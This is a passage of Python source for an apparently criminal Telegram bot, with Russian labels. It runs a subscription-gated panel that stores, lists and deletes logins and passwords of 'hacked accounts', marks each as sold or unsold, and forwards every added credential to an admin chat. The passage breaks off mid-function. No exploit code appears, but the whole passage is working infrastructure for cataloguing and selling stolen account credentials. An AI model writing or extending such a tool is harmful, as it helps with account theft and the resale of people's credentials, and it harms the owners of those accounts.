    response = "🌐 *Наш официальный сайт*: https://tg-bod.onrender.com"
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /site: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /hacked
@bot.message_handler(commands=['hacked'])
def hacked_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/hacked от {chat_id}")
    access = check_access(chat_id, 'hacked')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.reply_to(message, "❌ *База данных недоступна! Попробуйте позже.*", parse_mode='Markdown')
        return
    try:
        with conn.cursor() as c:
            c.execute("SELECT login, password, sold_status, hack_date FROM hacked_accounts")
            accounts = c.fetchall()
            response = "💻 *Взломанные аккаунты*\n\n" if accounts else "📭 *Список взломанных аккаунтов пуст.*\n"
            for idx, (login, password, status, hack_date) in enumerate(accounts, 1):
                response += (
                    f"🔑 *Логин #{idx}*: `{login}`\n"
                    f"🔒 *Пароль*: `{password}`\n"
                    f"📊 *Статус*: {status}\n"
                    f"🕒 *Добавлено*: {hack_date or 'Неизвестно'}\n\n"
                )
            bot.reply_to(message, response, parse_mode='Markdown')
            user = get_user(chat_id)
            if user:
                save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /hacked: {e}")
        bot.reply_to(message, "❌ *Ошибка при загрузке данных!*", parse_mode='Markdown')
    finally:
        conn.close()

# /passwords
@bot.message_handler(commands=['passwords'])
def passwords_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/passwords от {chat_id}")
    access = check_access(chat_id, 'passwords')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.reply_to(message, "❌ *База данных недоступна! Попробуйте позже.*", parse_mode='Markdown')
        return
    try:
        with conn.cursor() as c:
            c.execute("SELECT login, password, added_time FROM credentials")
            credentials = c.fetchall()
            if not credentials:
                bot.reply_to(message, "📭 *Список паролей пуст.*", parse_mode='Markdown')
            else:
                for idx, (login, password, added_time) in enumerate(credentials, 1):
                    response = (
                        f"🔐 *Логин #{idx}*: `{login}`\n"
                        f"🔒 *Пароль*: `{password}`\n"
                        f"🕒 *Добавлено*: {added_time or 'Неизвестно'}\n"
                    )
                    keyboard = types.InlineKeyboardMarkup()
                    if get_user(chat_id)['prefix'] in ["Админ", "Создатель", "ТехПомощник"]:
                        keyboard.add(
                            types.InlineKeyboardButton(
                                f"🗑 Удалить #{idx}",
                                callback_data=f"delete_cred_{login}_{idx}"
                            )
                        )
                    bot.send_message(
                        chat_id,
                        response,
                        reply_markup=keyboard,
                        parse_mode='Markdown'
                    )
            user = get_user(chat_id)
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(
                types.InlineKeyboardButton("➕ Добавить в hacked", callback_data="add_to_hacked")
            )
            if user and user['prefix'] in ["Админ", "Создатель", "ТехПомощник"]:
                keyboard.add(
                    types.InlineKeyboardButton("➕ Добавить пароль", callback_data="add_cred")
                )
            bot.send_message(
                chat_id,
                "⚙️ *Выберите действие*:",
                reply_markup=keyboard,
                parse_mode='Markdown'
            )
            if user:
                save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /passwords: {e}")
        bot.reply_to(message, "❌ *Ошибка при загрузке данных!*", parse_mode='Markdown')
    finally:
        conn.close()

@bot.callback_query_handler(func=lambda call: call.data.startswith('delete_cred_') or call.data in ['add_to_hacked', 'add_cred'])
def handle_passwords_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Кнопка {call.data} от {chat_id}")
    access = check_access(chat_id, 'passwords')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    user = get_user(chat_id)
    if not user:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "❌ *Пользователь не найден!*", parse_mode='Markdown')
        return
    if call.data.startswith('delete_cred_'):
        if user['prefix'] not in ['Админ', 'Создатель', 'ТехПомощник']:
            bot.answer_callback_query(call.id)
            bot.send_message(chat_id, "🔒 *Удаление паролей только для админов!*", parse_mode='Markdown')
            return
        try:
            _, login, idx = call.data.split('_', 2)
            conn = get_db_connection()
            if not conn:
                bot.send_message(chat_id, "❌ *База данных недоступна!*", parse_mode='Markdown')
                bot.answer_callback_query(call.id)
                return
            with conn.cursor() as c:
                c.execute("DELETE FROM credentials WHERE login = %s", (login,))
                if c.rowcount == 0:
                    bot.send_message(chat_id, "❌ *Логин не найден!*", parse_mode='Markdown')
                else:
                    conn.commit()
                    bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=call.message.message_id,
                        text=f"✅ *Логин #{idx} `{login}` удалён!*",
                        parse_mode='Markdown'
                    )
            bot.answer_callback_query(call.id)
        except Exception as e:
            logger.error(f"Ошибка удаления: {e}")
            bot.send_message(chat_id, "❌ *Ошибка удаления!*", parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        finally:
            if conn:
                conn.close()
    elif call.data == 'add_to_hacked':
        if user['prefix'] not in ['Админ', 'Создатель', 'ТехПомощник']:
            bot.answer_callback_query(call.id)
            bot.send_message(chat_id, "🔒 *Добавление в hacked только для админов!*", parse_mode='Markdown')
            return
        msg = bot.send_message(chat_id, "📝 *Введите логин для добавления в hacked*:", parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_hacked_login)
        bot.answer_callback_query(call.id)
    elif call.data == 'add_cred':
        if user['prefix'] not in ['Админ', 'Создатель', 'ТехПомощник']:
            bot.answer_callback_query(call.id)
            bot.send_message(chat_id, "🔒 *Добавление паролей только для админов!*", parse_mode='Markdown')
            return
        msg = bot.send_message(chat_id, "📝 *Введите логин для добавления*:", parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_add_cred_login)
        bot.answer_callback_query(call.id)

def process_hacked_login(message):
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"Логин: {login} от {chat_id}")
    if not login:
        bot.reply_to(message, "❌ *Логин не может быть пустым!*", parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.reply_to(message, "❌ *База данных недоступна!*", parse_mode='Markdown')
        return
    try:
        with conn.cursor() as c:
            c.execute("SELECT password FROM credentials WHERE login = %s", (login,))
            result = c.fetchone()
            if not result:
                bot.reply_to(message, "❌ *Логин не найден в базе паролей!*", parse_mode='Markdown')
                return
            password = result[0]
            msg = bot.reply_to(message, "🔒 *Введите новый пароль*:", parse_mode='Markdown')
            bot.register_next_step_handler(msg, lambda m: process_hacked_password(m, login, password))
    except Exception as e:
        logger.error(f"Ошибка логина: {e}")
        bot.reply_to(message, "❌ *Ошибка обработки!*", parse_mode='Markdown')
    finally:
        conn.close()

def process_hacked_password(message, login, old_password):
    chat_id = str(message.chat.id)
    new_password = sanitize_input(message.text)
    logger.info(f"Пароль для {login}: {new_password}")
    if not new_password:
        bot.reply_to(message, "❌ *Пароль не может быть пустым!*", parse_mode='Markdown')
        return
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton("✅ Продан", callback_data=f"hacked_status_sold_{login}_{new_password}"),
        types.InlineKeyboardButton("⛔ Непродан", callback_data=f"hacked_status_not_sold_{login}_{new_password}")
    )
    bot.reply_to(message, "📊 *Выберите статус аккаунта*:", reply_markup=keyboard, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data.startswith('hacked_status_'))
def handle_hacked_status(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Статус {call.data} от {chat_id}")
    access = check_access(chat_id, 'passwords')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    try:
        _, status, login, password = call.data.split('_', 3)
        sold_status = "Продан" if status == "sold" else "Непродан"
        conn = get_db_connection()
        if not conn:
            bot.send_message(chat_id, "❌ *База данных недоступна!*", parse_mode='Markdown')
            bot.answer_callback_query(call.id)
            return
        with conn.cursor() as c:
            c.execute(
                '''
                INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id)
                VALUES (%s, %s, %s, %s, %s, %s)
                ON CONFLICT (login) DO UPDATE
                SET password = EXCLUDED.password,
                    hack_date = EXCLUDED.hack_date,
                    prefix = EXCLUDED.prefix,
                    sold_status = EXCLUDED.sold_status,
                    linked_chat_id = EXCLUDED.linked_chat_id
                ''',
                (login, password, get_current_time().isoformat(), "Админ", sold_status, chat_id)
            )
            c.execute("DELETE FROM credentials WHERE login = %s", (login,))
            conn.commit()
            bot.send_message(
                chat_id,
                f"✅ *Аккаунт `{login}` добавлен в hacked!*\n📊 *Статус*: {sold_status}",
                parse_mode='Markdown'
            )
            bot.send_message(
                ADMIN_CHAT_ID,
                f"💾 *Аккаунт добавлен в hacked*\n👤 *Логин*: `{login}`\n🔒 *Пароль*: `{password}`\n📊 *Статус*: {sold_status}\n➕ *Добавил*: {chat_id}",
                parse_mode='Markdown'
            )
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"Ошибка hacked: {e}")
        bot.send_message(chat_id, "❌ *Ошибка добавления!*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)
    finally:
        if conn:
            conn.close()

def process_add_cred_login(message):
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"Логин для credentials: {login} от {chat_id}")
    if not login:
        bot.reply_to(message, "❌ *Логин не может быть пустым!*", parse_mode='Markdown')
        return
    msg = bot.reply_to(message, "🔒 *Введите пароль*:", parse_mode='Markdown')
    bot.register_next_step_handler(msg, lambda m: process_add_cred_password(m, login))

def process_add_cred_password(message, login):
    chat_id = str(message.chat.id)
    password = sanitize_input(message.text)
    logger.info(f"Пароль для {login} от {chat_id}")
    if not password:
        bot.reply_to(message, "❌ *Пароль не может быть пустым!*", parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.reply_to(message, "❌ *База данных недоступна!*", parse_mode='Markdown')
        return
    try:
        with conn.cursor() as c:
            c.execute(
                '''
                INSERT INTO credentials (login, password, added_time, added_by)
                VALUES (%s, %s, %s, %s)
                ON CONFLICT (login) DO UPDATE
                SET password = EXCLUDED.password,
                    added_time = EXCLUDED.added_time,
                    added_by = EXCLUDED.added_by
                ''',
                (login, password, get_current_time().isoformat(), chat_id)
            )
            conn.commit()
            bot.reply_to(
                message,
                f"✅ *Пароль для `{login}` добавлен в credentials!*",
                parse_mode='Markdown'
            )
            bot.send_message(
                ADMIN_CHAT_ID,
                f"🔐 *Добавлен пароль*\n👤 *Логин*: `{login}`\n🔒 *Пароль*: `{password}`\n➕ *Добавил*: {chat_id}",
                parse_mode='Markdown'
            )
    except Exception as e:
        logger.error(f"Ошибка добавления: {e}")
        bot.reply_to(message, "❌ *Ошибка добавления!*", parse_mode='Markdown')
    finally:
        conn.close()

# /logins
@bot.message_handler(commands=['logins'])
def logins_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/logins от {chat_id}")
    access = check_access(chat_id, 'logins')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    logins = read_logins_from_file()
    if not logins:
        bot.reply_to(message, "📭 *Список логинов пуст или файл недоступен.*", parse_mode='Markdown')
        return
    try:
        user = get_user(chat_id)
        is_admin = user and user['prefix'] in ["Админ", "Создатель", "ТехПомощник"]
        for idx, login in enumerate(logins, 1):
            response = f"🔐 *Логин #{idx}*: `{login}`\n"
            keyboard = types.InlineKeyboardMarkup()
            if is_admin:
                keyboard.add(
                    types.InlineKeyboardButton(
                        f"🗑 Удалить #{idx}",
                        callback_data=f"delete_file_login_{login}_{idx}"
                    )
                )
            bot.send_message(
                chat_id,
                response,
                reply_markup=keyboard,
                parse_mode='Markdown'
            )
        if is_admin:
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(
                types.InlineKeyboardButton("➕ Добавить логин", callback_data="add_file_login")
            )
            bot.send_message(
                chat_id,
                "⚙️ *Действия с логинами*:",
                reply_markup=keyboard,
                parse_mode='Markdown'
            )
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /logins: {e}")
        bot.reply_to(message, "❌ *Ошибка при загрузке логинов!*", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data.startswith('delete_file_login_') or call.data == 'add_file_login')
def handle_logins_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Кнопка {call.data} от {chat_id}")
    access = check_access(chat_id, 'logins')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    user = get_user(chat_id)
    if not user or user['prefix'] not in ['Админ', "Создатель", 'ТехПомощник']:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "🔒 *Действия с логинами только для админов!*", parse_mode='Markdown')
        return
    if call.data.startswith('delete_file_login_'):
        try:
            _, login, idx = call.data.split('_', 2)
            if delete_login_from_file(login):
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"✅ *Логин #{idx} `{login}` удалён из файла!*",
                    parse_mode='Markdown'
                )
            else:
                bot.send_message(chat_id, "❌ *Ошибка удаления логина!*", parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        except Exception as e:
            logger.error(f"Ошибка удаления логина: {e}")
            bot.send_message(chat_id, "❌ *Ошибка удаления!*", parse_mode='Markdown')
            bot.answer_callback_query(call.id)
    elif call.data == 'add_file_login':
        msg = bot.send_message(chat_id, "📝 *Введите логин для добавления в файл*:", parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_add_file_login)
        bot.answer_callback_query(call.id)

def process_add_file_login(message):
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"Добавление логина {login} в файл от {chat_id}")
    if not login:
        bot.reply_to(message, "❌ *Логин не может быть пустым!*", parse_mode='Markdown')
        return
    try:
        with open(LOGINS_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{login}\n")
        bot.reply_to(message, f"✅ *Логин `{login}` добавлен в файл!*", parse_mode='Markdown')
        bot.send_message(
            ADMIN_CHAT_ID,
            f"📜 *Добавлен логин в файл*\n👤 *Логин*: `{login}`\n➕ *Добавил*: {chat_id}",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Ошибка добавления логина: {e}")
        bot.reply_to(message, "❌ *Ошибка добавления!*", parse_mode='Markdown')

# /database
@bot.message_handler(commands=['database'])
def database_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/database от {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    response = "🗄 *Управление базой данных*\nВыберите действие:"
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("🔍 Просмотреть данные", callback_data="db_view"),
        types.InlineKeyboardButton("➕ Добавить данные", callback_data="db_add"),
        types.InlineKeyboardButton("🗑 Удалить данные", callback_data="db_delete")
    )
    try:
        bot.reply_to(message, response, reply_markup=keyboard, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /database: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data in ['db_view', 'db_add', 'db_delete'])
def handle_database_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Кнопка {call.data} от {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    if call.data == 'db_view':
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton("👥 Пользователи", callback_data="db_view_users"),
            types.InlineKeyboardButton("🔐 Пароли", callback_data="db_view_credentials"),
            types.InlineKeyboardButton("💻 Взломанные аккаунты", callback_data="db_view_hacked"),
            types.InlineKeyboardButton("🔙 Назад", callback_data="db_main_menu")
        )
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="🔍 *Выберите таблицу для просмотра*:",
            parse_mode='Markdown',
            reply_markup=keyboard
        )
        bot.answer_callback_query(call.id)
    elif call.data == 'db_add':
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton("💾 В hacked", callback_data="db_add_hacked"),
            types.InlineKeyboardButton("🔐 В credentials", callback_data="db_add_cred"),
            types.InlineKeyboardButton("👤 Пользователь", callback_data="db_add_user"),
            types.InlineKeyboardButton("🔙 Назад", callback_data="db_main_menu")
        )
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="➕ *Куда добавить данные?*:",
            parse_mode='Markdown',
            reply_markup=keyboard
        )
        bot.answer_callback_query(call.id)
    elif call.data == 'db_delete':
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton("🔐 Удалить пароль", callback_data="db_delete_cred"),
            types.InlineKeyboardButton("💾 Удалить hacked", callback_data="db_delete_hacked"),
            types.InlineKeyboardButton("👤 Удалить пользователя", callback_data="db_delete_user"),
            types.InlineKeyboardButton("🔙 Назад", callback_data="db_main_menu")
        )
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="🗑 *Что удалить?*:",
            parse_mode='Markdown',
            reply_markup=keyboard
        )
        bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith('db_view_'))
def handle_db_view_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Просмотр {call.data} от {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.send_message(chat_id, "❌ *База данных недоступна!*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)
        return
    try:
        with conn.cursor() as c:
            if call.data == 'db_view_users':
                c.execute("SELECT chat_id, prefix, username, subscription_end FROM users")
                users = c.fetchall()
                if not users:
                    bot.send_message(chat_id, "📭 *Список пользователей пуст.*", parse_mode='Markdown')
                else:
                    for idx, (chat_id_db, prefix, username_db, sub_end) in enumerate(users, 1):
                        response = (
                            f"👤 *Пользователь #{idx}*: `{chat_id_db}`\n"
                            f"🔑 *Префикс*: `{prefix}`\n"
                            f"🕒 *Подписка до*: {sub_end or 'Неизвестно'}\n"
                            f"📛 *Юзернейм*: @{username_db or 'Неизвестно'}\n"
                        )
                        keyboard = types.InlineKeyboardMarkup()
                        keyboard.add(
                            types.InlineKeyboardButton(
                                f"🗑 Удалить #{idx}",
                                callback_data=f"db_delete_user_{chat_id_db}_{idx}"
                            )
                        )
                        bot.send_message(
                            chat_id,
                            response,
                            reply_markup=keyboard,
                            parse_mode='Markdown'
                        )
            elif call.data == 'db_view_credentials':
                c.execute("SELECT login, password, added_time FROM credentials")
                credentials = c.fetchall()
                if not credentials:
                    bot.send_message(chat_id, "📭 *Список паролей пуст.*", parse_mode='Markdown')
                else:
                    for idx, (login, password, added_time) in enumerate(credentials, 1):
                        response = (
                            f"🔐 *Логин #{idx}*: `{login}`\n"
                            f"🔒 *Пароль*: `{password}`\n"
                            f"🕒 *Добавлено*: {added_time or 'Неизвестно'}\n"
                        )
                        keyboard = types.InlineKeyboardMarkup()
                        keyboard.add(
                            types.InlineKeyboardButton(
                                f"🗑 Удалить #{idx}",
                                callback_data=f"db_delete_cred_{login}_{idx}"
                            )
                        )
                        bot.send_message(
                            chat_id,
                            response,
                            reply_markup=keyboard,
                            parse_mode='Markdown'
                        )
            elif call.data == 'db_view_hacked':
                c.execute("SELECT login, password, sold_status, hack_date FROM hacked_accounts")
                hacked = c.fetchall()
                if not hacked:
                    bot.send_message(chat_id, "📭 *Список взломанных аккаунтов пуст.*", parse_mode='Markdown')
                else:
                    for idx, (login, password, status, hack_date) in enumerate(hacked, 1):
                        response = (
                            f"💻 *Логин #{idx}*: `{login}`\n"
                            f"🔒 *Пароль*: `{password}`\n"
                            f"📊 *Статус*: `{status}`\n"
                            f"🕒 *Взломан*: {hack_date or 'Неизвестно'}\n"
                        )
                        keyboard = types.InlineKeyboardMarkup()
                        keyboard.add(
                            types.InlineKeyboardButton(
                                f"🗑 Удалить #{idx}",
                                callback_data=f"db_delete_hacked_{login}_{idx}"
                            )
                        )
                        bot.send_message(
                            chat_id,
                            response,
                            reply_markup=keyboard,
                            parse_mode='Markdown'
                        )
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(
                types.InlineKeyboardButton("🔙 Назад", callback_data="db_main_menu")
            )
            bot.send_message(
                chat_id,
                "⚙️ *Вернуться в меню базы?*:",
                reply_markup=keyboard,
                parse_mode='Markdown'
            )
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"Ошибка просмотра: {e}")
        bot.send_message(chat_id, "❌ *Ошибка просмотра данных!*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)
    finally:
        conn.close()

@bot.callback_query_handler(func=lambda call: call.data.startswith('db_delete_'))
def handle_db_delete_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Удаление {call.data} от {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.send_message(chat_id, "❌ *База данных недоступна!*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)
        return
    try:
        with conn.cursor() as c:
            if call.data.startswith('db_delete_cred_'):
                _, login, idx = call.data.split('_', 2)
                c.execute("DELETE FROM credentials WHERE login = %s", (login,))
                if c.rowcount == 0:
                    bot.send_message(chat_id, "❌ *Логин не найден!*", parse_mode='Markdown')
                else:
                    conn.commit()
                    bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=call.message.message_id,
                        text=f"✅ *Логин #{idx} `{login}` удалён!*",
                        parse_mode='Markdown'
                    )
            elif call.data.startswith('db_delete_hacked_'):
                _, login, idx = call.data.split('_', 2)
                c.execute("DELETE FROM hacked_accounts WHERE login = %s", (login,))
                if c.rowcount == 0:
                    bot.send_message(chat_id, "❌ *Логин не найден!*", parse_mode='Markdown')
                else:
                    conn.commit()
                    bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=call.message.message_id,
                        text=f"✅ *Логин #{idx} `{login}` удалён!*",
                        parse_mode='Markdown'
                    )
            elif call.data.startswith('db_delete_user_'):
                _, target_id, idx = call.data.split('_', 2)
                if target_id == ADMIN_CHAT_ID:
                    bot.send_message(chat_id, "❌ *Нельзя удалить Создателя!*", parse_mode='Markdown')
                else:
                    c.execute("DELETE FROM users WHERE chat_id = %s", (target_id,))
                    if c.rowcount == 0:
                        bot.send_message(chat_id, "❌ *Пользователь не найден!*", parse_mode='Markdown')
                    else:
                        conn.commit()
                        bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=call.message.message_id,
                            text=f"✅ *Пользователь #{idx} `{target_id}` удалён!*",
                            parse_mode='Markdown'
                        )
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"Ошибка удаления: {e}")
        bot.send_message(chat_id, "❌ *Ошибка удаления!*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)
    finally:
        conn.close()

@bot.callback_query_handler(func=lambda call: call.data == 'db_main_menu')
def handle_db_main_menu(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Возврат в меню от {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    response = "🗄 *Управление базой данных*\nВыберите действие:"
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("🔍 Просмотреть данные", callback_data="db_view"),
        types.InlineKeyboardButton("➕ Добавить данные", callback_data="db_add"),
        types.InlineKeyboardButton("🗑 Удалить данные", callback_data="db_delete")
    )
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text=response,
        parse_mode='Markdown',
        reply_markup=keyboard
    )
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data in ['db_add_hacked', 'db_add_cred', 'db_add_user'])
def handle_db_add_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Добавление {call.data} от {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    if call.data == 'db_add_hacked':
        msg = bot.send_message(chat_id, "📝 *Введите логин для hacked*:", parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_add_hacked_login)
        bot.answer_callback_query(call.id)
    elif call.data == 'db_add_cred':
        msg = bot.send_message(chat_id, "📝 *Введите логин для credentials*:", parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_add_cred_login)
        bot.answer_callback_query(call.id)
    elif call.data == 'db_add_user':
        msg = bot.send_message(
            chat_id,
            "📝 *Введите chat_id и префикс (через пробел)*:",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, process_add_user)
        bot.answer_callback_query(call.id)

def process_add_hacked_login(message):
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"Логин для hacked: {login} от {chat_id}")
    if not login:
        bot.reply_to(message, "❌ *Логин не может быть пустым!*", parse_mode='Markdown')
        return
    msg = bot.reply_to(message, "🔒 *Введите пароль*:", parse_mode='Markdown')
    bot.register_next_step_handler(msg, lambda m: process_add_hacked_password(m, login))

def process_add_hacked_password(message, login):
    chat_id = str(message.chat.id)
    password = sanitize_input(message.text)
    logger.info(f"Пароль для {login} в hacked от {chat_id}")
    if not password:
        bot.reply_to(message, "❌ *Пароль не может быть пустым!*", parse_mode='Markdown')
        return
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton("✅ Продан", callback_data=f"hacked_add_status_sold_{login}_{password}"),
        types.InlineKeyboardButton("⛔ Непродан", callback_data=f"hacked_add_status_not_sold_{login}_{password}")
    )
    bot.reply_to(message, "📊 *Выберите статус аккаунта*:", reply_markup=keyboard, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data.startswith('hacked_add_status_'))
def handle_hacked_add_status(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Статус hacked {call.data} от {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    try:
        _, status, login, password = call.data.split('_', 3)
        sold_status = "Продан" if status == "sold" else "Непродан"
        conn = get_db_connection()
        if not conn:
            bot.send_message(chat_id, "❌ *База данных недоступна!*", parse_mode='Markdown')
            bot.answer_callback_query(call.id)
            return
        with conn.cursor() as c:
            c.execute(
                '''
                INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id)
                VALUES (%s, %s, %s, %s, %s, %s)
                ON CONFLICT (login) DO UPDATE
                SET password = EXCLUDED.password,
                    hack_date = EXCLUDED.hack_date,
                    prefix = EXCLUDED.prefix,
                    sold_status = EXCLUDED.sold_status,
                    linked_chat_id = EXCLUDED.linked_chat_id
                ''',
                (login, password, get_current_time().isoformat(), "Админ", sold_status, chat_id)
            )
            conn.commit()
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"✅ *Аккаунт `{login}` добавлен в hacked!*\n📊 *Статус*: {sold_status}",
                parse_mode='Markdown'
            )
            bot.send_message(
                ADMIN_CHAT_ID,
                f"💾 *Аккаунт добавлен в hacked*\n👤 *Логин*: `{login}`\n🔒 *Пароль*: `{password}`\n📊 *Статус*: {sold_status}\n➕ *Добавил*: {chat_id}",
                parse_mode='Markdown'
            )
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"Ошибка добавления в hacked: {e}")
        bot.send_message(chat_id, "❌ *Ошибка добавления!*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)
    finally:
        if conn:
            conn.close()

def process_add_user(message):
    chat_id = str(message.chat.id)
    logger.info(f"Добавление пользователя от {chat_id}")
    try:
        target_id, prefix = sanitize_input(message.text).split()
        if not target_id or not prefix:
            bot.reply_to(message, "❌ *Введите chat_id и префикс через пробел!*", parse_mode='Markdown')
            return
        subscription_end = (get_current_time() + timedelta(days=30)).isoformat()
        save_user(target_id, prefix, subscription_end, target_id, "Неизвестно")
        bot.reply_to(
            message,
            f"✅ *Пользователь `{target_id}` добавлен!*\n🔑 *Префикс*: `{prefix}`\n🕒 *Подписка до*: {format_time(subscription_end)}",
            parse_mode='Markdown'
        )
        bot.send_message(
            ADMIN_CHAT_ID,
            f"👤 *Добавлен пользователь*\n🆔 *Chat ID*: `{target_id}`\n🔑 *Префикс*: `{prefix}`\n➕ *Добавил*: {chat_id}",
            parse_mode='Markdown'
        )
    except ValueError:
        bot.reply_to(message, "❌ *Формат: chat_id префикс!*", parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Ошибка добавления пользователя: {e}")
        bot.reply_to(message, "❌ *Ошибка добавления!*", parse_mode='Markdown')

# /viewdb
@bot.message_handler(commands=['viewdb'])
def viewdb_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
